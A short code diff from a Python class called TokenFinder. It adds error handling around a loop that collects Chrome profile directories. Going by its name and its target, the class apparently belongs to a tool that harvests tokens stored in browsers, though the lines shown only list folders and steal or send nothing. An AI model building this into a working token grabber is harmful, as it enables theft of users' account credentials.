@@ -64,9 +64,12 @@ class TokenFinder:
         path = appdata + "Google/Chrome/"
         profiles = []
 
-        for file in os.listdir(path):
-            if file.startswith("Profile"):
-                profiles.append(os.path.join(path, file))
+        try:
+            for file in os.listdir(path):
+                if file.startswith("Profile"):
+                    profiles.append(os.path.join(path, file))
+        except FileNotFoundError:
+            pass
 
         return profiles
 
